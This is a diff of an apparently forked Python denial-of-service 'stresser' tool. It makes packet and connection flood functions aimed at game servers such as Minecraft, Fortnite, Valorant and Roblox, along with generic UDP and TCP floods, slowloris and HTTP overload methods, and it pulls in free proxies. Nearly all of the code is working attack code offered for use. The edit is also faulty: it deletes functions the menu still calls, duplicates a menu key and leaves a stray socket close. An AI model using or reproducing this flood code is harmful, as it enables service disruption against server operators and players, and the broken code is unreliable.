@@ -6,21 +6,18 @@ import os
 from datetime import datetime
 from colorama import init, Fore
 
-# Initialize Colorama
 init(autoreset=True)
 
-# Set window title
-print(f"\033]0;Super Python Stresser V3 By nightmare-stresser.co\007", end="", flush=True)
+print(f"\033]0;Super Python Stresser V3 By nightmare-stresser.co [FORKED BY FREAKYFD]\007", end="", flush=True)
 
-# ASCII Art (Sleek and Advanced)
 ASCII_ART = f"{Fore.LIGHTBLUE_EX}\n" \
             f"  ******************************************\n" \
             f"  *      Super Python Stresser V3          *\n" \
             f"  *    Made by https://nightmare-stresser.co *\n" \
+            f"  *           ¨Forked by FreakyFDP          *\n" \
             f"  *      Advanced Network Stress Tool      *\n" \
             f"  ******************************************\n"
 
-# Fetch HTTP proxies
 def fetch_proxies():
     url = "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/http_proxies.txt"
     try:
@@ -33,328 +30,262 @@ def fetch_proxies():
 
 PROXIES = fetch_proxies()
 
-# Game Methods
 def minecraft_handshake(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     packet_count = 0
     handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(10)
     print(Fore.CYAN + f"Starting Minecraft Handshake Flood on {ip}:{port} for {duration} seconds...")
     try:
-        while time.time() < end_time:
-            sock.connect((ip, port))
-            sock.send(handshake)
-            packet_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            while time.time() < end_time:
+                sock.connect((ip, port))
+                sock.send(handshake)
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} handshake packets.")
 
 def minecraft_login(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     packet_count = 0
     login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(5)
     print(Fore.CYAN + f"Starting Minecraft Login Flood on {ip}:{port} for {duration} seconds...")
     try:
-        while time.time() < end_time:
-            sock.connect((ip, port))
-            sock.send(login)
-            packet_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            while time.time() < end_time:
+                sock.connect((ip, port))
+                sock.send(login)
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} login attempts.")
 
-def pubg_packet(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    end_time = time.time() + duration
-    packet_count = 0
-    payload = b"PUBG" + random.randbytes(100)
-    print(Fore.CYAN + f"Starting PUBG Packet Flood on {ip}:{port} for {duration} seconds...")
-    try:
-        while time.time() < end_time:
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
-    except Exception as e:
-        print(Fore.RED + f"Error: {e}")
-    finally:
-        sock.close()
-        print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
-
 def pubg_connect(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     connection_count = 0
     print(Fore.CYAN + f"Starting PUBG Connect Flood on {ip}:{port} for {duration} seconds...")
     try:
-        while time.time() < end_time:
-            sock.connect_ex((ip, port))
-            connection_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            while time.time() < end_time:
+                sock.connect_ex((ip, port))
+                connection_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Made {connection_count} connections.")
 
 def blackops6_spam(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = b"BO6" + random.randbytes(50)
     print(Fore.CYAN + f"Starting Black Ops 6 Spam on {ip}:{port} for {duration} seconds...")
     try:
-        while time.time() < end_time:
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            while time.time() < end_time:
+                sock.sendto(payload, (ip, port))
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def cod_connect(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     connection_count = 0
     print(Fore.CYAN + f"Starting Call of Duty Connect Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.connect_ex((ip, port))
-            connection_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect_ex((ip, port))
+                connection_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Made {connection_count} connections.")
 
-def csgo_query(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    end_time = time.time() + duration
-    packet_count = 0
-    query = b"\xFF\xFF\xFF\xFF\x54Source Engine Query\x00"
-    print(Fore.CYAN + f"Starting CS:GO Query Flood on {ip}:{port} for {duration} seconds...")
-    try:
-        while time.time() < end_time:
-            sock.sendto(query, (ip, port))
-            packet_count += 1
-    except Exception as e:
-        print(Fore.RED + f"Error: {e}")
-    finally:
-        sock.close()
-        print(Fore.GREEN + f"Completed! Sent {packet_count} query packets.")
-
 def rust_connect(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     connection_count = 0
     print(Fore.CYAN + f"Starting Rust Connect Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.connect_ex((ip, port))
-            connection_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect_ex((ip, port))
+                connection_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Made {connection_count} connections.")
 
 def ark_spam(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = b"ARK" + random.randbytes(50)
     print(Fore.CYAN + f"Starting ARK Spam on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(payload, (ip, port))
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def fortnite_packet(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = b"FORT" + random.randbytes(80)
     print(Fore.CYAN + f"Starting Fortnite Packet Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(payload, (ip, port))
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def apex_connect(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     connection_count = 0
     print(Fore.CYAN + f"Starting Apex Legends Connect Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.connect_ex((ip, port))
-            connection_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect_ex((ip, port))
+                connection_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Made {connection_count} connections.")
 
 def valorant_spam(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = b"VALO" + random.randbytes(60)
     print(Fore.CYAN + f"Starting Valorant Spam on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(payload, (ip, port))
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def gta_online_connect(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     connection_count = 0
     print(Fore.CYAN + f"Starting GTA Online Connect Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.connect_ex((ip, port))
-            connection_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect_ex((ip, port))
+                connection_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Made {connection_count} connections.")
 
 def roblox_query(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = b"RBX" + random.randbytes(70)
     print(Fore.CYAN + f"Starting Roblox Query Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(payload, (ip, port))
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
-# Layer 4 UDP Methods
 def udp_stdhex(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = bytes.fromhex("DEADBEEF") + random.randbytes(packet_size - 4)
     print(Fore.CYAN + f"Starting UDP StdHex Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(payload, (ip, port))
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def udp_plain(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = b"A" * packet_size
     print(Fore.CYAN + f"Starting UDP Plain Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(payload, (ip, port))
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def udp_bypass(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payloads = [random.randbytes(packet_size) for _ in range(10)]
     print(Fore.CYAN + f"Starting UDP Bypass Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.sendto(random.choice(payloads), (ip, port))
-            packet_count += 1
-            time.sleep(0.001)
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(random.choice(payloads), (ip, port))
+                packet_count += 1
+                time.sleep(0.001)
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def udp_burst(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = random.randbytes(packet_size)
     print(Fore.CYAN + f"Starting UDP Burst Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            for _ in range(5):
-                sock.sendto(payload, (ip, port))
-                packet_count += 1
-            time.sleep(0.1)
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                for _ in range(5):
+                    sock.sendto(payload, (ip, port))
+                    packet_count += 1
+                time.sleep(0.1)
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def udp_storm(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = b"STORM" + random.randbytes(packet_size - 5)
     print(Fore.CYAN + f"Starting UDP Storm Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(payload, (ip, port))
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def udp_rush(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = random.randbytes(packet_size)
@@ -362,81 +293,75 @@ def udp_rush(ip, port, duration, packet_size):
     try:
         while time.time() < end_time:
             for _ in range(10):
-                sock.sendto(payload, (ip, port))
-                packet_count += 1
+                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                    sock.sendto(payload, (ip, port))
+                    packet_count += 1
             time.sleep(0.05)
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def udp_blast(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = b"BLAST" + random.randbytes(packet_size - 5)
     print(Fore.CYAN + f"Starting UDP Blast Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
-            time.sleep(0.002)
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(payload, (ip, port))
+                packet_count += 1
+                time.sleep(0.002)
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
         sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
-# Layer 4 TCP Methods
 def tcp_bypass(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     packet_count = 0
     payloads = [random.randbytes(packet_size) for _ in range(5)]
     print(Fore.CYAN + f"Starting TCP Bypass Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.connect((ip, port))
-            sock.send(random.choice(payloads))
-            packet_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            time.sleep(0.002)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect((ip, port))
+                sock.send(random.choice(payloads))
+                packet_count += 1
+                time.sleep(0.002)
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def tcp_syn(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     packet_count = 0
     print(Fore.CYAN + f"Starting TCP SYN Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.connect_ex((ip, port))
-            packet_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect_ex((ip, port))
+                packet_count += 1
+                sock.close()
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} SYN packets.")
 
 def tcp_ack(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = b"\x00" * packet_size
     print(Fore.CYAN + f"Starting TCP ACK Flood on {ip}:{port} for {duration} seconds...")
     try:
-        sock.connect((ip, port))
-        while time.time() < end_time:
-            sock.send(payload)
-            packet_count += 1
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.connect((ip, port))
+            while time.time() < end_time:
+                sock.send(payload)
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
@@ -444,78 +369,67 @@ def tcp_ack(ip, port, duration, packet_size):
         print(Fore.GREEN + f"Completed! Sent {packet_count} ACK packets.")
 
 def tcp_connect(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     connection_count = 0
     print(Fore.CYAN + f"Starting TCP Connect Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.connect_ex((ip, port))
-            connection_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect_ex((ip, port))
+                connection_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Made {connection_count} connections.")
 
 def tcp_wave(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = b"WAVE" + random.randbytes(packet_size - 4)
     print(Fore.CYAN + f"Starting TCP Wave Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.connect((ip, port))
-            sock.send(payload)
-            packet_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect((ip, port))
+                sock.send(payload)
+                packet_count += 1
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
 def tcp_surge(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     connection_count = 0
     print(Fore.CYAN + f"Starting TCP Surge Flood on {ip}:{port} for {duration} seconds...")
     try:
         while time.time() < end_time:
-            sock.connect_ex((ip, port))
-            connection_count += 1
-            sock.close()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            time.sleep(0.001)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect_ex((ip, port))
+                connection_count += 1
+                time.sleep(0.001)
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Made {connection_count} connections.")
 
 def tcp_crush(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     end_time = time.time() + duration
     packet_count = 0
     payload = b"CRUSH" + random.randbytes(packet_size - 5)
     print(Fore.CYAN + f"Starting TCP Crush Flood on {ip}:{port} for {duration} seconds...")
     try:
-        sock.connect((ip, port))
-        while time.time() < end_time:
-            sock.send(payload)
-            packet_count += 1
-            time.sleep(0.002)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.connect((ip, port))
+            while time.time() < end_time:
+                sock.send(payload)
+                packet_count += 1
+                time.sleep(0.002)
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
     finally:
-        sock.close()
         print(Fore.GREEN + f"Completed! Sent {packet_count} packets.")
 
-# Layer 7 HTTPS Methods
 def slowloris(ip, duration):
     end_time = time.time() + duration
     connection_count = 0
@@ -620,7 +534,6 @@ def http_overload(ip, duration):
     finally:
         print(Fore.GREEN + f"Completed! Sent {request_count} POST requests.")
 
-# CheckHost Methods
 def ping_check(ip):
     print(Fore.CYAN + f"Starting Ping Check on {ip}...")
     try:
@@ -914,11 +827,11 @@ def main():
                     port = validate_input("Enter port (1-65535): ", 1, 65535)
                     duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)
                     methods = {
-                        "1": minecraft_handshake, "2": minecraft_login, "3": pubg_packet,
-                        "4": pubg_connect, "5": blackops6_spam, "6": cod_connect,
-                        "7": csgo_query, "8": rust_connect, "9": ark_spam,
-                        "10": fortnite_packet, "11": apex_connect, "12": valorant_spam,
-                        "13": gta_online_connect, "14": roblox_query
+                        "1": minecraft_handshake, "2": minecraft_login,
+                        "3": pubg_connect, "4": blackops6_spam, "5": cod_connect,
+                        "6": csgo_query, "7": rust_connect, "8": ark_spam,
+                        "9": fortnite_packet, "10": apex_connect, "11": valorant_spam,
+                        "12": gta_online_connect, "12": roblox_query
                     }
                     methods[method](ip, port, duration)
                 else:
